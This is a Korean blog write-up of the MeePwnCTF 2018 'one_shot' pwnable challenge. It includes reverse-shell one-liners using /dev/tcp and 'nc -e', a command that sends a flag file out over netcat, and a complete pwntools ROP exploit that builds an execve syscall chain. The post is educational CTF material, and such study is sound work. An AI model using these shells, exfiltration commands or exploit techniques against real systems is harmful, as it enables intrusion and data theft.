---
layout: post
title: ! "[MeePwnCTF2018] one_shot Writeup"
comments: true
excerpt_separator: <!--more-->
tags:
  - MyriaBreak
  - Write-up
  - CTF
  - pwnable
---

얼마전 있었던 `MeePwnCTF 2018`에서 나왔던 `one_shot`이란 문제이다.
CTF 시간이 48시간이였던지라, 여유를 가지고 풀어보려고 잡았으나.. 30시간이 넘게 시간을 투자하였음에도 불구하고 풀지못했다 ㅡㅡ;
끝나고 난 뒤, IRC를 통해 사람들이 리버스쉘을 통해 푸는 문제라고 말한 것을 듣고 충격이 있었으나, 어짜피 리버스쉘을 실행시켜도 내 쪽 서버가 없어서 결국 못푸는 문제였던거 같다.

뭐 그래도, 이렇게 하나 배워가는 것이고, 다음에 비슷한 문제가 나온다면 팀원들 중에 개인서버가 있는 사람한테 부탁해서라도 풀 수 있지않을까 생각한다.

는 무슨 하루종일 리버스쉘만 따려고 별짓을 다했는데 안된다 ㅡㅡ;
아 화난다 진짜;; 아으ㅏㅇ

<!--more-->

![]({{ site.baseurl }}/images/myria/one-shot-writeup/oneshot_01.PNG)  

```
nc 178.128.87.12 31338

https://ctf.meepwn.team/attachments/pwn/one_shot_7f980ea94c21c4c45b47b126b8678777.tar.gz
```

문제는 내용은 위와 같다. 현재는 서버가 닫혔으므로, 로컬에서 `Exploit`을 진행하도록 하겠다. 먼저 어떤 보호기법들이 적용되있는지 살펴보자.

![]({{ site.baseurl }}/images/myria/one-shot-writeup/oneshot_02.PNG)

>sherlock@ubuntu:~/workstation/2018_CTF/MeePwn/one_shot$ file one_shot
one_shot: ELF 64-bit LSB  executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.32, BuildID[sha1]=29266d4ecc4a047f613a525401fbd87650e968ed, stripped


`64bit`바이너리파일이고, `stripped`되있다. 일단 잘 모르겠으니 실행해보면 사용자로부터 입력을 받는것 같은데, 입력 후 그냥 종료되어버리는 것을 알 수있다.
정확한 동작을 모르겠으니 IDA를 이용해서 살펴보기로 하였다.

![]({{ site.baseurl }}/images/myria/one-shot-writeup/oneshot_03.PNG)  

이 프로그램을 실행하면 사용자로부터 `0x234`만큼의 데이터를 `read`함수를 통해 받고, close()를 통해 `stdin`, `stdout`, `stderr`를 닫아버린다.

처음에는 이 3개를 닫아도 아무 문제없을 것이라 생각했는데... 이 3개가 닫히니 아에 아무것도 할 수가 없게되었다 ㅡㅡ;

`stdout`이 닫혀있다보니, 출력이 안되므로 `leak`을 못한다. 그러므로 `libc_base`주소를 구하는 것도 못하고, 어떻게해서 쉘을 띄운다고 해도 `stdin`,`stdout`이 닫혀있으니, 상호작용을 할 수가 없다.

그런데 정작 나는 그것을 고려하지도 않고, "어떻게해서든 쉘만 띄우면 되겠지~"하고 ROP로 `execve("/bin/sh", 0, 0)`을 실행시켰는데, 안돼서 "왜 쉘이 안띄워지는것이냐!!" 하면서 미쳐버리는줄 알았다... 하;

참고로 CTF 당시에 작성한 payload를 써서 strace로 추적해보면 정상적으로 `execve("/bin/sh", 0, 0)`가 실행되는 것을 볼 수있는데, 물론 `stdin`,`stdout`이 막혀있기때문에 바로 종료되는 것을 볼 수 있다.

![]({{ site.baseurl }}/images/myria/one-shot-writeup/oneshot_04.PNG)  

그렇기때문에 여기서는 `리버스쉘`을 사용해서 클라이언트쪽에서 포트를 열어주고, 서버쪽에서 그 포트로 접속하여 flag를 보내게하던지, 아니면 쉘을 띄워주던지해야한다.
그래서 밑의 2가지 방법 등으로 쉘을 띄울수가 있다.

1. bash의 /dev/tcp를 이용한 방법 (ip:`127.0.0.1` port:`1234`)
>/bin/sh >& /dev/tcp/127.0.0.1/1234 0>&1

2. netcat을 이용한 방법
>nc -e /bin/sh 127.0.0.1 1234

문제는 서버쪽에서 저 연결을 유지를 못시켜주는 것 같아서 (stdin, stdout이 닫힌것과 관련있을지도), 결국 또 하루종일 리버스쉘띄우려다가 결국 못띄우고, 명령어 하나씩 실행해서 결과를 서버쪽에 리턴받는 방식으로 하기로 했다.


계획은 이렇다.

1. 자신의 개인서버에서 netcat으로 포트를 연다.
>  nc -l -p 1234

2. execve("/bin/sh", ["/bin/sh","-c", "명령어",0], 0)을 실행하여 원하는 명령을 실행하고, 그 결과를 자신의 서버로 전송하는 payload를 작성해 공격한다.
>  명령어 : cat /home/sherlock/flag | nc 127.0.0.1 1234

3. 1~2를 통해 `flag`의 위치를 알아내고, `flag`값을 자신의 서버에 전송한다.
4. `flag`를 획득한다.


자 그럼 먼저 `netcat`으로 서버의 포트를 열어주자.

![]({{ site.baseurl }}/images/myria/one-shot-writeup/oneshot_05.PNG)  

그리고 작성된 `python code`를 실행하자.

![]({{ site.baseurl }}/images/myria/one-shot-writeup/oneshot_06.PNG)

![]({{ site.baseurl }}/images/myria/one-shot-writeup/oneshot_07.PNG)

1234 포트를 열어둔 곳으로 가보면, 포트가 닫히고 flag값이 들어와있는 것을 볼 수 있다.

이렇게 문제를 풀 수 있는데, CTF 당시에는 가젯들을 이용해서 "/bin/sh"라는 값을 원하는 장소에 쓰는데 애를 먹었다.
CTF가 끝나고 나서 다른 팀의 writeup을 보고 좀 더 깔끔하고 편하게 원하는 값을 복사해서 쓰는 payload가 있길래 참고해서 더 쉽게 `exploit`하는 법을 적는다.

처음에는 buffer는 의미가 없고, 뒤의 ret만 조작해서 `ROP`하려했는데, buffer에 입력한 값을 복사해서 재활용할 수 있었다.

![]({{ site.baseurl }}/images/myria/one-shot-writeup/oneshot_08.PNG)

위의 코드를 보면 `i`변수에 `v5`의 주소를 넣고, `buffer`의 주소를 증가시키며 그 값을 v5에 `v2 byte`만큼 복사하는 것을 볼 수 있다.
이를 다시 어셈블리어로 보면 아래와 같다.

![]({{ site.baseurl }}/images/myria/one-shot-writeup/oneshot_09.PNG)

`rdi`가 있는 주소의 1바이트 값을 `rsi`에 복사하는 것을 볼 수 있다.
이를 반복하는데, `eax`만큼 반복하게 되어, 결국 `eax`byte만큼 `rdi`에서 `rsi`로 복사되게 된다.

이걸 이용해서 `buffer`에 "/bin/sh" 및 "-c", "nc IP PORT" 등을 쓰면 되고, 그 값을 원하는 주소에 복사하여 `exploit`에 활용할 수 있다.



```python
#!/usr/bin/env python
from pwn import *

conn = process("./one_shot")

check = 0x8a919ff0

alarm_plt = 0x400520
alarm_got = 0x601020
puts_plt = 0x400510

mov_eax = 0x004006f7 # mov eax, dword [rbp-0x0C] ; pop rbx ; pop rbp ; ret  ;  (1 found)
copy_rdi2rsi = 0x400684 # copies eax bytes from rdi to rsi
						# [rbp-0x20] and [rbp-0x1C] need to be equal (or null)

pop_rbp = 0x00400774 # pop rbp ; ret
pop_rdi = 0x00400843 # pop rdi ; ret  ;  (1 found)
pop_rsi_r15 = 0x400841 # pop rsi ; pop r15 ; ret

len_addr = 0x40070e # contains 0x234
trash_rbp = 0x601100 # random writable addr in a nulled area
copy_buffer_addr = 0x601600 # where our copied buffer will be

cmd = "cat /home/sherlock/flag | nc 127.0.0.1 1234"

### check pass
payload =  p32(check)
# execve("/bin/sh", )
payload += "/bin/sh\x00"
payload += "-c\x00"
payload += cmd
payload += "\x00"*10

#argv_address
argv_addr = copy_buffer_addr + len(payload)-4

# argv = ["/bin/sh", "-c", cmd, 0]
payload += p64(copy_buffer_addr) 	# "/bin/sh"
payload += p64(copy_buffer_addr+8) 	# "-c"
payload += p64(copy_buffer_addr+11) # cmd
payload += p64(0)					# NULL

# execve syscall num
execve_syscall_num_addr = copy_buffer_addr + len(payload)-4
payload += p64(59)
payload += "\x00"*(0x80-len(payload))

# now buffer is end and copy buffer
payload += p64(len_addr+0xc) # [rbp-0xc] is 0x234
payload += p64(mov_eax)  	 # eax = 0x234
payload += p64(0xdeadbeef)   # rbx
payload += p64(trash_rbp)   # rbp

payload += p64(pop_rsi_r15)	 # set rsi to new_buffer_address
payload += p64(copy_buffer_addr)
payload += p64(0xdeadbeef) 	 # r15
payload += p64(copy_rdi2rsi)
payload += p64(0xdeadbeef)  # rbx
payload += p64(trash_rbp)	# rbp

# make alarm call to syscall
# now rax value is 1
payload += p64(pop_rdi)	 # set rdi to (alarm+5) 1byte value   <alarm+5>:	syscall
payload += p64(0x4005e3) # contains byte 0xe5
payload += p64(pop_rsi_r15)	 # set rsi to new_buffer_address
payload += p64(alarm_got)
payload += p64(0xdeadbeef) 	 # r15
payload += p64(copy_rdi2rsi)
payload += p64(0xdeadbeef)  # rbx
payload += p64(trash_rbp)	# rbp

# now alarm call is syscall
# call execve!
payload += p64(pop_rbp)	 
payload += p64(execve_syscall_num_addr + 0xc)
payload += p64(mov_eax)	 # eax = 59
payload += p64(0xdeadbeef)   # rbx
payload += p64(trash_rbp)   # rbp

payload += p64(pop_rbp)	 
payload += p64(execve_syscall_num_addr + 0xc)
payload += p64(mov_eax)	 # eax = 59
payload += p64(0)   # rbx
payload += p64(trash_rbp)   # rbp

pop_r12_15 = 0x40083c   # pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret  ;  (1 found)
register_set_and_call_func   = 0x400820	# mov rdx, r13 ; mov rsi, r14 ; mov edi, r15d ; call qword [r12+rbx*8] ;  (1 found)

#set
payload += p64(pop_r12_15)
payload += p64(alarm_got)	# syscall set! r12=syscall_address & rbx=0 -> call qword [r12+rbx*8]
payload += p64(0)			# r13 -> rdx = 0
payload += p64(argv_addr)	# r14 -> rsi = argv_addr
payload += p64(copy_buffer_addr)	# r15 -> rdi = "/bin/sh\x00"
payload += p64(register_set_and_call_func)

log.info("payload_len : %x <= 0x234" % len(payload))

conn.send(payload)
conn.interactive()
```

위 파이썬 익스코드를 실행하면 로컬환경에 있는 flag를 획득할 수 있다.



### *후기

처음에는 문제 이름이 `one_shot`이길래, `oneshot_gadget`을 사용하란건 줄 알았다.
그래서 `leak`을 하기 위해 엄청나게 많은 시간을 투자하였으나, 무리였음을 깨닫게되었다..

뭐 그래도 reverse shell을 CTF에서 사용하는 걸 본게 처음이라, 나중을 위한 큰 도움이 될거라 생각한다.

문제는 내 서버가 없어서, 다음에 이런 문제가 나오면 어디서 쉘을 받느냐는 것이지만 ㅡㅡ;
